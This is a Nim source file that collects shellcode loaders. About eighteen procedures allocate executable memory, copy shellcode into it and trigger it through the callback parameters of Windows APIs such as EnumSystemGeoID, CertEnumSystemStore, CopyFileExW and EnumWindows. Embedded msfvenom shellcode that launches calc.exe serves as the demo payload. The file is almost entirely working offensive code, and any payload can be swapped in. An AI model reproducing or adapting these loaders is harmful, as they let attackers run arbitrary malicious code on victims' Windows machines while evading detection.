#[
    Author: StudyCat
    Blog: https://www.cnblogs.com/studycat
    Github: https://github.com/StudyCat404/myNimExamples

    References:
        - https://github.com/S3cur3Th1sSh1t/Nim_CBT_Shellcode
        - https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection
        - https://github.com/treeform/steganography
        - https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/encrypt_decrypt_bin.nim
]#

import winim
import winim/lean

proc doEnumSystemGeoID*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    
    
    # Callback execution
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](rPtr)
    ) 

proc doCertEnumSystemStore*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"

    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 

    # Callback execution
    CertEnumSystemStore(
        CERT_SYSTEM_STORE_CURRENT_USER,
        nil,
        nil,
        cast[PFN_CERT_ENUM_SYSTEM_STORE](rPtr)
    )

proc doCertEnumSystemStoreLocation*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"

    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 

    # Callback execution
    var dwordvar: DWORD
    CertEnumSystemStoreLocation(
        dwordvar,
        nil,
        cast[PFN_CERT_ENUM_SYSTEM_STORE_LOCATION](rPtr)
    )    
 
proc doCopy2*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"

    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 

    # Callback execution
    var param: COPYFILE2_EXTENDED_PARAMETERS
    param.dwSize = cast[int32](sizeof(param))
    param.dwCopyFlags = COPY_FILE_FAIL_IF_EXISTS
    param.pfCancel = cast[ptr WINBOOL](false)
    param.pProgressRoutine = cast[PCOPYFILE2_PROGRESS_ROUTINE](rPtr);
    param.pvCallbackContext = nil
        
    DeleteFileW("C:\\windows\\temp\\backup.log")
    CopyFile2("C:\\Windows\\DirectX.log","C:\\windows\\temp\\backup.log",param) 

proc doCopyFileExW*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    
    
    # Callback execution
    DeleteFileW("C:\\windows\\temp\\backup.log")
    CopyFileExW("C:\\Windows\\DirectX.log","C:\\windows\\temp\\backup.log",cast[LPPROGRESS_ROUTINE](rPtr), nil, cast[LPBOOL](FALSE), COPY_FILE_FAIL_IF_EXISTS)

proc doEnumChildWindows*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    

    # Callback execution
    EnumChildWindows(
        cast[HWND](nil),
        cast[WNDENUMPROC](rPtr),
        0x0
    )    
    
proc doEnumDesktopWindows*(shellcode: openarray[byte]) : void =    
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))    

    # Callback execution
    EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()),cast[WNDENUMPROC](rPtr), cast[LPARAM](nil))
    
proc doEnumPageFilesW*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    EnumPageFilesW(cast[PENUM_PAGE_FILE_CALLBACKW](rPtr), nil)    
    
proc doImageGetDigestStream*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    let himg = CreateFileW("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, cast[DWORD](nil))
    var dummy: DIGEST_HANDLE
    ImageGetDigestStream(himg, CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, cast[DIGEST_FUNCTION](rPtr), dummy)
    CloseHandle(cast[HANDLE](dummy))
    CloseHandle(himg)


proc SymEnumProcesses(x, y: PVOID)
    {.cdecl, dynlib: "c:\\windows\\system32\\Dbghelp.dll", importc.}
            
proc doSymEnumProcesses*(shellcode: openarray[byte]) : void =   
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    SymInitialize(GetCurrentProcess(),nil,false)
    SymEnumProcesses(rPtr, nil)
    
proc doEnumDateFormatsA*(shellcode: openarray[byte]) : void =   
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    EnumDateFormatsA(cast[DATEFMT_ENUMPROCA](rPtr) , LOCALE_SYSTEM_DEFAULT, cast[DWORD](0))    

proc doEnumSystemCodePagesA*(shellcode: openarray[byte]) : void =   
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    EnumSystemCodePagesA(cast[CODEPAGE_ENUMPROCA](rPtr) ,0)
 
proc doEnumSystemLanguageGroupsA*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution    
    EnumSystemLanguageGroupsA(cast[LANGUAGEGROUP_ENUMPROCA](rPtr),LGRPID_SUPPORTED,0)
    
proc doEnumSystemLocalesA*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](rPtr) ,0)   

proc doEnumThreadWindows*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    EnumThreadWindows(0, cast[WNDENUMPROC](rPtr), 0)    
    
proc doEnumUILanguagesA*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    EnumUILanguagesA(cast[UILANGUAGE_ENUMPROCA](rPtr), MUI_LANGUAGE_ID, 0)    
    
proc doEnumWindows*(shellcode: openarray[byte]) : void =
    let tProcess = GetCurrentProcessId()
    echo "[*] Target Process: ", tProcess
    echo "    \\-- bytes written: ", shellcode.len
    echo "[+] Injected"
    
    # Allocate memory
    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )    
    
    # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
    
    # Callback execution
    EnumWindows(cast[WNDENUMPROC](rPtr), cast[LPARAM](nil))
    
proc main() =
    # https://github.com/nim-lang/Nim/wiki/Consts-defined-by-the-compiler
    when defined(i386):
        # msfvenom -p windows/exec -f csharp CMD="calc.exe" modified for Nim arrays
        echo "[*] Running in x86 process"
        var shellcode: array[193, byte] = [
        byte 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
        0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
        0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
        0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
        0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
        0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
        0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
        0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
        0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
        0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
        0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
        0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
        0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00]

    elif defined(amd64):
        # msfvenom -p windows/x64/exec -f csharp CMD="calc.exe" modified for Nim arrays
        echo "[*] Running in x64 process"
        var shellcode: array[276, byte] = [
        byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
        0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
        0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
        0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
        0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
        0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
        0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
        0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
        0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
        0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
        0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
        0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
        0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
        0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
        0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
        0x63,0x2e,0x65,0x78,0x65,0x00]    
 
        doEnumChildWindows(shellcode)
        
when isMainModule:
    when defined(windows):
        main()